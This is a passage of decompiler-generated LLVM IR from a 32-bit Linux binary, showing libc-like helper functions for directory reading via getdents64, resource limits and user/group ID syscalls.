  store i32 %v2_8051e50, i32* @ebx, align 4
  ret i32 %v0_8051e4b

; uselistorder directives
  uselistorder i32 %v4_8051e1d, { 1, 2, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_8051e4b, { 2, 0, 1 }
}

define i32 @function_8051e52(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051e52:
  %eax.global-to-local = alloca i32, align 4
  %v0_8051e52 = load i32, i32* @edi, align 4
  %v0_8051e53 = load i32, i32* @esi, align 4
  %v0_8051e54 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v0_8051e59 = load i32, i32* @edx, align 4
  %v7_8051e63 = inttoptr i32 %arg2 to i32*
  %v8_8051e63 = call i32 @function_8051ec1(i32 %arg1, i32* %v7_8051e63, i32 %arg3, i32 %v0_8051e59, i32 %v0_8051e54, i32 %v0_8051e53, i32 %v0_8051e52)
  store i32 %v8_8051e63, i32* %eax.global-to-local, align 4
  store i32 %v8_8051e63, i32* @esi, align 4
  %tmp24 = icmp slt i32 %v8_8051e63, 1
  br i1 %tmp24, label %dec_label_pc_8051ebb, label %dec_label_pc_8051e71

dec_label_pc_8051e71:                             ; preds = %dec_label_pc_8051e52
  %v0_8051e71 = load i32, i32* @ebx, align 4
  %v2_8051e71 = add i32 %v0_8051e71, %v8_8051e63
  store i32 %v2_8051e71, i32* @edi, align 4
  %v7_8051eb74 = icmp ult i32 %v0_8051e71, %v2_8051e71
  br i1 %v7_8051eb74, label %dec_label_pc_8051e76, label %dec_label_pc_8051ebb

dec_label_pc_8051e76:                             ; preds = %dec_label_pc_8051e71, %dec_label_pc_8051e76
  %v0_8051e76 = phi i32 [ %v2_8051eb5, %dec_label_pc_8051e76 ], [ %v0_8051e71, %dec_label_pc_8051e71 ]
  %v1_8051e76 = add i32 %v0_8051e76, 8
  %v2_8051e76 = inttoptr i32 %v1_8051e76 to i32*
  %v3_8051e76 = load i32, i32* %v2_8051e76, align 4
  store i32 %v3_8051e76, i32* %eax.global-to-local, align 4
  %v2_8051e79 = add i32 %v0_8051e76, 4
  %v3_8051e79 = inttoptr i32 %v2_8051e79 to i32*
  store i32 %v3_8051e76, i32* %v3_8051e79, align 4
  %v0_8051e7c = load i32, i32* @ebx, align 4
  %v1_8051e7c = add i32 %v0_8051e7c, 16
  %v2_8051e7c = inttoptr i32 %v1_8051e7c to i32*
  %v3_8051e7c = load i32, i32* %v2_8051e7c, align 4
  store i32 %v3_8051e7c, i32* %eax.global-to-local, align 4
  %v1_8051e7f = trunc i32 %v3_8051e7c to i16
  %v3_8051e7f = add i32 %v0_8051e7c, 8
  %v4_8051e7f = inttoptr i32 %v3_8051e7f to i16*
  store i16 %v1_8051e7f, i16* %v4_8051e7f, align 2
  %v0_8051e83 = load i32, i32* @ebx, align 4
  %v1_8051e83 = add i32 %v0_8051e83, 18
  %v2_8051e83 = inttoptr i32 %v1_8051e83 to i8*
  %v3_8051e83 = load i8, i8* %v2_8051e83, align 1
  %v4_8051e83 = zext i8 %v3_8051e83 to i32
  %v5_8051e83 = load i32, i32* %eax.global-to-local, align 4
  %v6_8051e83 = and i32 %v5_8051e83, -256
  %v7_8051e83 = or i32 %v6_8051e83, %v4_8051e83
  store i32 %v7_8051e83, i32* %eax.global-to-local, align 4
  %v3_8051e86 = add i32 %v0_8051e83, 10
  %v4_8051e86 = inttoptr i32 %v3_8051e86 to i8*
  store i8 %v3_8051e83, i8* %v4_8051e86, align 1
  %v0_8051e8a = load i32, i32* @ebx, align 4
  %v1_8051e8a = add i32 %v0_8051e8a, 8
  %v2_8051e8a = inttoptr i32 %v1_8051e8a to i16*
  %v3_8051e8a = load i16, i16* %v2_8051e8a, align 2
  %v4_8051e8a = zext i16 %v3_8051e8a to i32
  %v1_8051e8e = add nsw i32 %v4_8051e8a, -19
  %v1_8051e92 = add i32 %v0_8051e8a, 19
  %v1_8051e96 = add i32 %v0_8051e8a, 11
  store i32 %v1_8051e96, i32* %eax.global-to-local, align 4
  %v3_8051e9a = inttoptr i32 %v1_8051e96 to i8*
  %v4_8051e9a = call i32 @function_80500b3(i8* %v3_8051e9a, i32 %v1_8051e92, i32 %v1_8051e8e)
  store i32 %v4_8051e9a, i32* %eax.global-to-local, align 4
  %v0_8051ea2 = load i32, i32* @ebx, align 4
  %v1_8051ea2 = add i32 %v0_8051ea2, 8
  %v2_8051ea2 = inttoptr i32 %v1_8051ea2 to i16*
  %v3_8051ea2 = load i16, i16* %v2_8051ea2, align 2
  %v4_8051ea2 = zext i16 %v3_8051ea2 to i32
  store i32 %v4_8051ea2, i32* %eax.global-to-local, align 4
  %v3_8051ea9 = inttoptr i32 %v0_8051ea2 to i8*
  %v4_8051ea9 = call i32 @function_80500b3(i8* %v3_8051ea9, i32 %v0_8051ea2, i32 %v4_8051ea2)
  store i32 %v4_8051ea9, i32* %eax.global-to-local, align 4
  %v0_8051eae = load i32, i32* @ebx, align 4
  %v1_8051eae = add i32 %v0_8051eae, 8
  %v2_8051eae = inttoptr i32 %v1_8051eae to i16*
  %v3_8051eae = load i16, i16* %v2_8051eae, align 2
  %v4_8051eae = zext i16 %v3_8051eae to i32
  store i32 %v4_8051eae, i32* %eax.global-to-local, align 4
  %v2_8051eb5 = add i32 %v4_8051eae, %v0_8051eae
  store i32 %v2_8051eb5, i32* @ebx, align 4
  %v1_8051eb7 = load i32, i32* @edi, align 4
  %v7_8051eb7 = icmp ult i32 %v2_8051eb5, %v1_8051eb7
  br i1 %v7_8051eb7, label %dec_label_pc_8051e76, label %dec_label_pc_8051eb7.dec_label_pc_8051ebb.loopexit_crit_edge

dec_label_pc_8051eb7.dec_label_pc_8051ebb.loopexit_crit_edge: ; preds = %dec_label_pc_8051e76
  %v0_8051ebb.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051ebb

dec_label_pc_8051ebb:                             ; preds = %dec_label_pc_8051e71, %dec_label_pc_8051eb7.dec_label_pc_8051ebb.loopexit_crit_edge, %dec_label_pc_8051e52
  %v0_8051ebb = phi i32 [ %v8_8051e63, %dec_label_pc_8051e52 ], [ %v0_8051ebb.pre.pre, %dec_label_pc_8051eb7.dec_label_pc_8051ebb.loopexit_crit_edge ], [ %v8_8051e63, %dec_label_pc_8051e71 ]
  store i32 %v0_8051ebb, i32* %eax.global-to-local, align 4
  store i32 %v0_8051e53, i32* @esi, align 4
  store i32 %v0_8051e52, i32* @edi, align 4
  ret i32 %v0_8051ebb

; uselistorder directives
  uselistorder i32 %v0_8051ebb, { 1, 0 }
  uselistorder i32 %v2_8051eb5, { 1, 2, 0 }
  uselistorder i32 %v0_8051ea2, { 1, 0, 2 }
  uselistorder i32 %v0_8051e8a, { 1, 0, 2 }
  uselistorder i32 %v0_8051e76, { 1, 0 }
  uselistorder i32 %v0_8051e71, { 0, 2, 1 }
  uselistorder i32 %v8_8051e63, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 11, { 11, 9, 10, 16, 5, 2, 6, 3, 7, 4, 8, 12, 13, 14, 15, 0, 1, 17, 18 }
  uselistorder label %dec_label_pc_8051ebb, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051e76, { 1, 0 }
}

define i32 @function_8051ec1(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8051ec1:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-60 = alloca i32, align 4
  %v0_8051ec4 = load i32, i32* @edi, align 4
  %v0_8051ec6 = load i32, i32* @ebx, align 4
  %v15_8051ec7 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v1_8051ed0 = add i32 %arg3, 30
  store i32 %arg3, i32* @edx, align 4
  %v1_8051ed6 = and i32 %v1_8051ed0, -16
  %v2_8051ed9 = sub i32 %v15_8051ec7, %v1_8051ed6
  %v1_8051edb = add i32 %v2_8051ed9, 15
  %v1_8051edf = and i32 %v1_8051edb, -16
  %v1_8051ee5 = inttoptr i32 %v1_8051edf to %linux_dirent64*
  store i32 %v1_8051edf, i32* %ecx.global-to-local, align 4
  %v2_8051ee7 = add i32 %v2_8051ed9, -4
  %v3_8051ee7 = inttoptr i32 %v2_8051ee7 to i32*
  store i32 %v0_8051ec6, i32* %v3_8051ee7, align 4
  %v0_8051ee8 = load i32, i32* %edi.global-to-local, align 4
  store i32 220, i32* %eax.global-to-local, align 4
  %v5_8051eef = call i32 @getdents64(i32 %v0_8051ee8, %linux_dirent64* %v1_8051ee5, i32 %arg3)
  store i32 %v5_8051eef, i32* %eax.global-to-local, align 4
  %v0_8051ef1 = load i32, i32* @esp, align 4
  %v3_8051ef1 = add i32 %v0_8051ef1, 4
  %tmp41 = icmp ult i32 %v5_8051eef, -4095
  br i1 %tmp41, label %dec_label_pc_8051f0b, label %dec_label_pc_8051efc

dec_label_pc_8051efc:                             ; preds = %dec_label_pc_8051ec1
  %v1_8051efc = call i32 @function_8050089(i32 %v5_8051eef)
  store i32 %v1_8051efc, i32* %eax.global-to-local, align 4
  %v4_8051f01 = sub i32 0, %v5_8051eef
  store i32 %v4_8051f01, i32* @edx, align 4
  %v2_8051f07 = inttoptr i32 %v1_8051efc to i32*
  store i32 %v4_8051f01, i32* %v2_8051f07, align 4
  br label %dec_label_pc_8051fcd

dec_label_pc_8051f0b:                             ; preds = %dec_label_pc_8051ec1
  store i32 %tmp14, i32* @esi, align 4
  store i32 %v1_8051edf, i32* @ebx, align 4
  %v5_8051fbd = add i32 %v5_8051eef, %v1_8051edf
  store i32 %v5_8051fbd, i32* %eax.global-to-local, align 4
  %v7_8051fc030 = icmp ult i32 %v1_8051edf, %v5_8051fbd
  br i1 %v7_8051fc030, label %dec_label_pc_8051f2a.lr.ph, label %dec_label_pc_8051fc8

dec_label_pc_8051f2a.lr.ph:                       ; preds = %dec_label_pc_8051f0b
  %v5_8051f37 = add i32 %tmp14, %arg3
  br label %dec_label_pc_8051f2a

dec_label_pc_8051f2a:                             ; preds = %dec_label_pc_8051f2a.lr.ph, %dec_label_pc_8051f6c
  %stack_var_-32.036 = phi i32 [ -1, %dec_label_pc_8051f2a.lr.ph ], [ %v3_8051f6f, %dec_label_pc_8051f6c ]
  %stack_var_-36.035 = phi i32 [ -1, %dec_label_pc_8051f2a.lr.ph ], [ %v3_8051f6c, %dec_label_pc_8051f6c ]
  %v0_8051f7834 = phi i32 [ %v1_8051edf, %dec_label_pc_8051f2a.lr.ph ], [ %v2_8051fb5, %dec_label_pc_8051f6c ]
  %v1_8051f7d33 = phi i32 [ %tmp14, %dec_label_pc_8051f2a.lr.ph ], [ %v2_8051f3a, %dec_label_pc_8051f6c ]
  %v0_8051f4432 = phi i32 [ %v3_8051ef1, %dec_label_pc_8051f2a.lr.ph ], [ %v1_8051fb7, %dec_label_pc_8051f6c ]
  %v1_8051f2a = add i32 %v0_8051f7834, 16
  %v2_8051f2a = inttoptr i32 %v1_8051f2a to i16*
  %v3_8051f2a = load i16, i16* %v2_8051f2a, align 2
  %v4_8051f2a = zext i16 %v3_8051f2a to i32
  %v1_8051f2e = add nuw nsw i32 %v4_8051f2a, 3
  %v1_8051f34 = and i32 %v1_8051f2e, 131068
  store i32 %v1_8051f34, i32* %ecx.global-to-local, align 4
  store i32 %v5_8051f37, i32* %eax.global-to-local, align 4
  %v2_8051f3a = add i32 %v1_8051f34, %v1_8051f7d33
  %tmp42 = icmp ugt i32 %v2_8051f3a, %v5_8051f37
  br i1 %tmp42, label %dec_label_pc_8051f44, label %dec_label_pc_8051f6c

dec_label_pc_8051f44:                             ; preds = %dec_label_pc_8051f2a
  %v1_8051f44 = add i32 %v0_8051f4432, -4
  %v2_8051f44 = inttoptr i32 %v1_8051f44 to i32*
  store i32 0, i32* %v2_8051f44, align 4
  %v5_8051f46 = add i32 %v0_8051f4432, -8
  %v6_8051f46 = inttoptr i32 %v5_8051f46 to i32*
  store i32 %stack_var_-32.036, i32* %v6_8051f46, align 4
  %v5_8051f49 = add i32 %v0_8051f4432, -12
  %v6_8051f49 = inttoptr i32 %v5_8051f49 to i32*
  store i32 %stack_var_-36.035, i32* %v6_8051f49, align 4
  %v5_8051f4c = add i32 %v0_8051f4432, -16
  %v6_8051f4c = inttoptr i32 %v5_8051f4c to i32*
  store i32 %arg1, i32* %v6_8051f4c, align 4
  %v1_8051f4f = call i32 @function_80520d7(i32 %v2_8051f3a)
  store i32 %v1_8051f4f, i32* %eax.global-to-local, align 4
  %v0_8051f57 = load i32, i32* @esi, align 4
  %v15_8051f57 = icmp eq i32 %v0_8051f57, %tmp14
  %v1_8051f5a = icmp eq i1 %v15_8051f57, false
  br i1 %v1_8051f5a, label %dec_label_pc_8051fc8, label %dec_label_pc_8051f5c

dec_label_pc_8051f5c:                             ; preds = %dec_label_pc_8051f44
  %v1_8051f5c = call i32 @function_8050089(i32 %v2_8051f3a)
  store i32 %v1_8051f5c, i32* %eax.global-to-local, align 4
  %v1_8051f61 = inttoptr i32 %v1_8051f5c to i32*
  store i32 22, i32* %v1_8051f61, align 4
  br label %dec_label_pc_8051fcd

dec_label_pc_8051f6c:                             ; preds = %dec_label_pc_8051f2a
  %v1_8051f6c = add i32 %v0_8051f7834, 8
  %v2_8051f6c = inttoptr i32 %v1_8051f6c to i32*
  %v3_8051f6c = load i32, i32* %v2_8051f6c, align 4
  store i32 %v3_8051f6c, i32* %eax.global-to-local, align 4
  %v1_8051f6f = add i32 %v0_8051f7834, 12
  %v2_8051f6f = inttoptr i32 %v1_8051f6f to i32*
  %v3_8051f6f = load i32, i32* %v2_8051f6f, align 4
  %v1_8051f78 = inttoptr i32 %v0_8051f7834 to i32*
  %v2_8051f78 = load i32, i32* %v1_8051f78, align 4
  store i32 %v2_8051f78, i32* %eax.global-to-local, align 4
  %v1_8051f7a = add i32 %v0_8051f7834, 4
  %v2_8051f7a = inttoptr i32 %v1_8051f7a to i32*
  %v3_8051f7a = load i32, i32* %v2_8051f7a, align 4
  %v2_8051f7d = add i32 %v1_8051f7d33, 4
  %v3_8051f7d = inttoptr i32 %v2_8051f7d to i32*
  store i32 %v3_8051f7a, i32* %v3_8051f7d, align 4
  %v0_8051f80 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051f80 = load i32, i32* @esi, align 4
  %v2_8051f80 = inttoptr i32 %v1_8051f80 to i32*
  store i32 %v0_8051f80, i32* %v2_8051f80, align 4
  %v0_8051f82 = load i32, i32* @ebx, align 4
  %v1_8051f82 = add i32 %v0_8051f82, 8
  %v2_8051f82 = inttoptr i32 %v1_8051f82 to i32*
  %v3_8051f82 = load i32, i32* %v2_8051f82, align 4
  store i32 %v3_8051f82, i32* %eax.global-to-local, align 4
  %v1_8051f85 = add i32 %v0_8051f82, 12
  %v2_8051f85 = inttoptr i32 %v1_8051f85 to i32*
  %v3_8051f85 = load i32, i32* %v2_8051f85, align 4
  store i32 %v3_8051f85, i32* @edx, align 4
  %v1_8051f88 = load i32, i32* @esi, align 4
  %v2_8051f88 = add i32 %v1_8051f88, 12
  %v3_8051f88 = inttoptr i32 %v2_8051f88 to i32*
  store i32 %v3_8051f85, i32* %v3_8051f88, align 4
  %v0_8051f8b = load i32, i32* %eax.global-to-local, align 4
  %v1_8051f8b = load i32, i32* @esi, align 4
  %v2_8051f8b = add i32 %v1_8051f8b, 8
  %v3_8051f8b = inttoptr i32 %v2_8051f8b to i32*
  store i32 %v0_8051f8b, i32* %v3_8051f8b, align 4
  %v0_8051f8e = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051f8e = trunc i32 %v0_8051f8e to i16
  %v2_8051f8e = load i32, i32* @esi, align 4
  %v3_8051f8e = add i32 %v2_8051f8e, 16
  %v4_8051f8e = inttoptr i32 %v3_8051f8e to i16*
  store i16 %v1_8051f8e, i16* %v4_8051f8e, align 2
  %v0_8051f92 = load i32, i32* @ebx, align 4
  %v1_8051f92 = add i32 %v0_8051f92, 18
  %v2_8051f92 = inttoptr i32 %v1_8051f92 to i8*
  %v3_8051f92 = load i8, i8* %v2_8051f92, align 1
  %v4_8051f92 = zext i8 %v3_8051f92 to i32
  %v5_8051f92 = load i32, i32* %eax.global-to-local, align 4
  %v6_8051f92 = and i32 %v5_8051f92, -256
  %v7_8051f92 = or i32 %v6_8051f92, %v4_8051f92
  store i32 %v7_8051f92, i32* %eax.global-to-local, align 4
  %v2_8051f95 = load i32, i32* @esi, align 4
  %v3_8051f95 = add i32 %v2_8051f95, 18
  %v4_8051f95 = inttoptr i32 %v3_8051f95 to i8*
  store i8 %v3_8051f92, i8* %v4_8051f95, align 1
  %v0_8051f98 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051f98 = load i32, i32* @esp, align 4
  %v2_8051f98 = add i32 %v1_8051f98, -4
  %v3_8051f98 = inttoptr i32 %v2_8051f98 to i32*
  store i32 %v0_8051f98, i32* %v3_8051f98, align 4
  %v0_8051f99 = load i32, i32* @ebx, align 4
  %v1_8051f99 = add i32 %v0_8051f99, 16
  %v2_8051f99 = inttoptr i32 %v1_8051f99 to i16*
  %v3_8051f99 = load i16, i16* %v2_8051f99, align 2
  %v4_8051f99 = zext i16 %v3_8051f99 to i32
  %v1_8051f9d = add nsw i32 %v4_8051f99, -19
  %v2_8051fa0 = add i32 %v1_8051f98, -8
  %v3_8051fa0 = inttoptr i32 %v2_8051fa0 to i32*
  store i32 %v1_8051f9d, i32* %v3_8051fa0, align 4
  %v0_8051fa1 = load i32, i32* @ebx, align 4
  %v1_8051fa1 = add i32 %v0_8051fa1, 19
  %v2_8051fa4 = add i32 %v1_8051f98, -12
  %v3_8051fa4 = inttoptr i32 %v2_8051fa4 to i32*
  store i32 %v1_8051fa1, i32* %v3_8051fa4, align 4
  %v0_8051fa5 = load i32, i32* @esi, align 4
  %v1_8051fa5 = add i32 %v0_8051fa5, 19
  store i32 %v1_8051fa5, i32* %eax.global-to-local, align 4
  %v2_8051fa8 = add i32 %v1_8051f98, -16
  %v3_8051fa8 = inttoptr i32 %v2_8051fa8 to i32*
  store i32 %v1_8051fa5, i32* %v3_8051fa8, align 4
  %v3_8051fa9 = inttoptr i32 %v2_8051f3a to i16*
  %v4_8051fa9 = call i32 @function_80522d2(i16* %v3_8051fa9, i32 %v3_8051f6c, i32 %v3_8051f6f)
  store i32 %v4_8051fa9, i32* %eax.global-to-local, align 4
  %v0_8051fae = load i32, i32* @ebx, align 4
  %v1_8051fae = add i32 %v0_8051fae, 16
  %v2_8051fae = inttoptr i32 %v1_8051fae to i16*
  %v3_8051fae = load i16, i16* %v2_8051fae, align 2
  %v4_8051fae = zext i16 %v3_8051fae to i32
  store i32 %v2_8051f3a, i32* @esi, align 4
  %v2_8051fb5 = add i32 %v4_8051fae, %v0_8051fae
  store i32 %v2_8051fb5, i32* @ebx, align 4
  %v0_8051fb7 = load i32, i32* @esp, align 4
  %v1_8051fb7 = add i32 %v0_8051fb7, 16
  store i32 %v5_8051fbd, i32* %eax.global-to-local, align 4
  %v7_8051fc0 = icmp ult i32 %v2_8051fb5, %v5_8051fbd
  br i1 %v7_8051fc0, label %dec_label_pc_8051f2a, label %dec_label_pc_8051fc8

dec_label_pc_8051fc8:                             ; preds = %dec_label_pc_8051f0b, %dec_label_pc_8051f6c, %dec_label_pc_8051f44
  %v0_8051fc8 = phi i32 [ %v0_8051f57, %dec_label_pc_8051f44 ], [ %tmp14, %dec_label_pc_8051f0b ], [ %v2_8051f3a, %dec_label_pc_8051f6c ]
  store i32 %v0_8051fc8, i32* %eax.global-to-local, align 4
  %v5_8051fca = sub i32 %v0_8051fc8, %tmp14
  br label %dec_label_pc_8051fcd

dec_label_pc_8051fcd:                             ; preds = %dec_label_pc_8051f5c, %dec_label_pc_8051efc, %dec_label_pc_8051fc8
  %storemerge = phi i32 [ %v5_8051fca, %dec_label_pc_8051fc8 ], [ -1, %dec_label_pc_8051efc ], [ -1, %dec_label_pc_8051f5c ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8051ec6, i32* @ebx, align 4
  store i32 %v0_8051ec4, i32* %edi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_8051fc8, { 1, 0 }
  uselistorder i32 %v2_8051fb5, { 0, 2, 1 }
  uselistorder i32 %v3_8051f6f, { 1, 0 }
  uselistorder i32 %v3_8051f6c, { 1, 2, 0 }
  uselistorder i32 %v2_8051f3a, { 0, 5, 6, 1, 2, 4, 3 }
  uselistorder i32 %v0_8051f4432, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8051f7834, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v5_8051fbd, { 2, 3, 0, 1 }
  uselistorder i32 %v5_8051eef, { 0, 3, 2, 1, 4 }
  uselistorder i32 %tmp14, { 5, 0, 2, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 16, 1, 15, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 19, 17, 0, 18 }
  uselistorder i32 (i16*, i32, i32)* @function_80522d2, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 19, { 5, 6, 7, 4, 0, 2, 1, 3 }
  uselistorder i32 18, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 22, { 10, 11, 5, 6, 7, 12, 3, 4, 8, 9, 0, 1, 2 }
  uselistorder i32 -12, { 17, 29, 65, 66, 18, 30, 31, 32, 33, 34, 28, 19, 24, 21, 20, 38, 39, 0, 40, 1, 2, 58, 53, 54, 55, 25, 26, 52, 27, 56, 57, 41, 3, 4, 22, 23, 5, 42, 43, 6, 7, 44, 8, 45, 9, 10, 46, 11, 47, 12, 13, 48, 14, 49, 15, 50, 51, 35, 36, 37, 59, 60, 61, 62, 63, 16, 64 }
  uselistorder i32 -8, { 0, 4, 52, 48, 50, 49, 51, 53, 54, 5, 6, 7, 8, 9, 10, 45, 1, 30, 17, 2, 14, 15, 16, 40, 34, 35, 36, 31, 32, 33, 37, 38, 39, 18, 19, 3, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 11, 12, 13, 41, 42, 43, 44, 46, 47 }
  uselistorder i32* @esp, { 67, 68, 69, 6, 7, 8, 9, 10, 205, 206, 0, 1, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 2, 3, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 11, 87, 12, 88, 13, 89, 14, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 15, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 139, 138, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 171, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 4, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 17, 207, 208, 209, 210, 201, 202, 203, 204, 22, 211, 212, 213, 214, 21, 219, 220, 221, 222, 32, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 215, 216, 217, 218, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 23, 248, 249, 250, 33, 251, 252, 253, 254, 255, 256, 257, 259, 258, 5, 260, 261, 262, 263, 264, 265, 266, 267, 20, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 31, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 16, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 25, 24, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 26, 331, 332, 333, 334, 335, 336, 337, 27, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 28, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 29, 358, 359, 30, 360, 361, 362, 363, 364, 365, 366, 367, 368, 19, 34, 369, 370, 371, 372, 373, 374, 375, 35, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 36, 475, 476, 477, 478, 479, 480, 481, 482, 37, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 18, 500, 501, 502 }
  uselistorder i32 15, { 6, 5, 11, 2, 1, 3, 0, 4, 7, 8, 9, 10 }
  uselistorder i32 -16, { 14, 36, 97, 98, 15, 38, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 94, 55, 54, 35, 53, 2, 65, 3, 17, 28, 81, 18, 66, 23, 21, 68, 22, 1, 16, 64, 19, 67, 20, 4, 12, 33, 34, 83, 11, 84, 85, 29, 30, 82, 31, 86, 32, 69, 5, 70, 24, 71, 25, 72, 6, 73, 7, 74, 75, 8, 76, 77, 9, 78, 79, 26, 80, 10, 27, 87, 88, 56, 57, 58, 59, 60, 61, 62, 63, 89, 90, 91, 92, 99, 0, 93, 13, 95, 96 }
  uselistorder i32 30, { 4, 3, 1, 2, 0 }
  uselistorder i32 %arg3, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051fcd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051fc8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8051f2a, { 1, 0 }
}

define i32 @function_8051fd5() local_unnamed_addr {
dec_label_pc_8051fd5:
  %stack_var_-8 = alloca i32, align 4
  %v2_8051fd8 = ptrtoint i32* %stack_var_-8 to i32
  %v2_8051fdf = call i32 @function_805207f(i32 7, i32 %v2_8051fd8)
  store i32 256, i32* @edx, align 4
  %v2_8051fec = icmp slt i32 %v2_8051fdf, 0
  br i1 %v2_8051fec, label %dec_label_pc_8051ff4, label %dec_label_pc_8051ff0

dec_label_pc_8051ff0:                             ; preds = %dec_label_pc_8051fd5
  %v3_8051ff0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8051ff0, i32* @edx, align 4
  br label %dec_label_pc_8051ff4

dec_label_pc_8051ff4:                             ; preds = %dec_label_pc_8051fd5, %dec_label_pc_8051ff0
  %v0_8051ff4 = phi i32 [ 256, %dec_label_pc_8051fd5 ], [ %v3_8051ff0, %dec_label_pc_8051ff0 ]
  ret i32 %v0_8051ff4

; uselistorder directives
  uselistorder i32 7, { 7, 17, 0, 1, 3, 8, 4, 9, 5, 10, 6, 11, 18, 19, 20, 14, 12, 15, 16, 21, 22, 13, 23, 24, 2 }
  uselistorder label %dec_label_pc_8051ff4, { 1, 0 }
}

define i32 @function_8051ffa() local_unnamed_addr {
dec_label_pc_8051ffa:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051ffa = load i32, i32* @ebx, align 4
  store i32 %v0_8051ffa, i32* %stack_var_-4, align 4
  %v1_8052003 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8052003, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052003, -4095
  br i1 %tmp7, label %dec_label_pc_805201a, label %dec_label_pc_805200e

dec_label_pc_805200e:                             ; preds = %dec_label_pc_8051ffa
  %v1_805200e = call i32 @function_8050089(i32 %v0_8051ffa)
  %v0_8052013 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052013 = sub i32 0, %v0_8052013
  %v2_8052015 = inttoptr i32 %v1_805200e to i32*
  store i32 %v1_8052013, i32* %v2_8052015, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805201e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805201a

dec_label_pc_805201a:                             ; preds = %dec_label_pc_8051ffa, %dec_label_pc_805200e
  %v2_805201e = phi i32 [ %v0_8051ffa, %dec_label_pc_8051ffa ], [ %v2_805201e.pre, %dec_label_pc_805200e ]
  %v0_805201a = phi i32 [ %v1_8052003, %dec_label_pc_8051ffa ], [ -1, %dec_label_pc_805200e ]
  store i32 %v2_805201e, i32* @ebx, align 4
  ret i32 %v0_805201a

; uselistorder directives
  uselistorder i32 %v1_8052003, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805201a, { 1, 0 }
}

define i32 @function_8052020() local_unnamed_addr {
dec_label_pc_8052020:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052020 = load i32, i32* @ebx, align 4
  store i32 %v0_8052020, i32* %stack_var_-4, align 4
  %v1_8052029 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8052029, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052029, -4095
  br i1 %tmp7, label %dec_label_pc_8052040, label %dec_label_pc_8052034

